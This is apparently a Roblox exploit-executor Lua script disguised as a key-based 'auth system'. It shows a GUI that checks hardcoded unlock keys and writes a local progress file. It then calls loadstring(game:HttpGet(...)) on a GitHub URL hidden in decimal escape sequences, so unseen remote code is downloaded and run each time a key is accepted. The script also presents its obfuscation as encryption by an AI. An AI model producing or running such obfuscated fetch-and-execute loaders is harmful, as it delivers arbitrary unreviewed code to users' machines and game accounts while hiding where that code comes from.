--[[ 
    JUAN_AUTH_SYSTEM_v11 (BOLIVIA_SECURE)
    ENCRYPTED BY: GEMINI_AI
    AUTHORIZED USER: JUAN
--]]

local _0x_G = getfenv()
local _0x_S = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\106\97\114\97\100\97\119\120\100\101\105\116\111\110\45\119\101\98\47\83\99\114\105\112\116\45\79\80\45\74\68\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\50\65\78\73\77\65\67\73\79\78\84\89\89\77\46\108\117\97"
local _0x_K = {
    [1]="4927",[2]="8105",[3]="3742",[4]="9261",[5]="1583",[6]="6039",[7]="2471",[8]="5814",[9]="7390",[10]="2056",
    [11]="8417",[12]="3962",[13]="5108",[14]="7723",[15]="4095",[16]="6281",[17]="1359",[18]="9042",[19]="2674",[20]="5510",
    [21]="3829",[22]="8647",[23]="1930",[24]="7258",[25]="4106",[26]="6394",[27]="2817",[28]="5043",[29]="9731",[30]="1468",[31]="8522"
}

local _0x_L = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
local _0x_D = "\74\117\97\110\65\117\116\104\95\68\97\116\97"
local _0x_F = "\99\111\110\102\105\103\46\116\120\116"

if not isfolder(_0x_D) then makefolder(_0x_D) end

local function _0x_X()
    if isfile(_0x_D.."/".._0x_F) then
        local _0x_C = readfile(_0x_D.."/".._0x_F)
        local _0x_n, _0x_t = _0x_C:match("([^,]+),([^,]+)")
        return tonumber(_0x_n) or 1, tonumber(_0x_t) or 0
    end
    return 1, 0
end

local function _0x_EXEC()
    loadstring(game:HttpGet(_0x_S))()
end

local _0x_N, _0x_T = _0x_X()
if os.time() - _0x_T < 86400 then
    _0x_EXEC()
    return
end

-- INTERFAZ OCULTA
local _0x_G_U = Instance.new("ScreenGui", _0x_L:WaitForChild("PlayerGui"))
_0x_G_U.Name = "\74\65\117\116\104"
_0x_G_U.ResetOnSpawn = false

local _0x_M = Instance.new("Frame", _0x_G_U)
_0x_M.Size = UDim2.new(0, 350, 0, 220)
_0x_M.Position = UDim2.new(0.5, -175, 0.5, -110)
_0x_M.BackgroundColor3 = Color3.fromRGB(15, 12, 20)
Instance.new("UICorner", _0x_M).CornerRadius = UDim.new(0, 15)
Instance.new("UIStroke", _0x_M).Color = Color3.fromRGB(110, 40, 200)

local _0x_T_I = Instance.new("TextLabel", _0x_M)
_0x_T_I.Text = "\74\85\65\78\32\83\89\83\84\69\77"
_0x_T_I.Size = UDim2.new(1, 0, 0, 40)
_0x_T_I.TextColor3 = Color3.fromRGB(180, 80, 255)
_0x_T_I.BackgroundTransparency = 1
_0x_T_I.Font = Enum.Font.GothamBold

local _0x_I_N = Instance.new("TextBox", _0x_M)
_0x_I_N.Size = UDim2.new(0, 300, 0, 45)
_0x_I_N.Position = UDim2.new(0.5, -150, 0.4, 0)
_0x_I_N.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
_0x_I_N.PlaceholderText = "\75\101\121\32\35" .. _0x_N
_0x_I_N.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", _0x_I_N)

local _0x_B = Instance.new("TextButton", _0x_M)
_0x_B.Size = UDim2.new(0, 300, 0, 45)
_0x_B.Position = UDim2.new(0.5, -150, 0.65, 0)
_0x_B.BackgroundColor3 = Color3.fromRGB(130, 60, 230)
_0x_B.Text = "\68\69\83\66\76\79\81\85\69\65\82"
_0x_B.TextColor3 = Color3.new(1, 1, 1)
_0x_B.Font = Enum.Font.GothamBold
Instance.new("UICorner", _0x_B)

_0x_B.MouseButton1Click:Connect(function()
    if _0x_I_N.Text == _0x_K[_0x_N] then
        _0x_B.Text = "\65\67\67\69\83\79\32\79\75"
        writefile(_0x_D.."/".._0x_F, tostring(_0x_N + 1)..","..tostring(os.time()))
        wait(1)
        _0x_G_U:Destroy()
        _0x_EXEC()
    else
        _0x_B.Text = "\73\78\67\79\82\82\69\67\84\79"
        _0x_B.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        wait(1)
        _0x_B.Text = "\68\69\83\66\76\79\81\85\69\65\82"
        _0x_B.BackgroundColor3 = Color3.fromRGB(130, 60, 230)
    end
end)
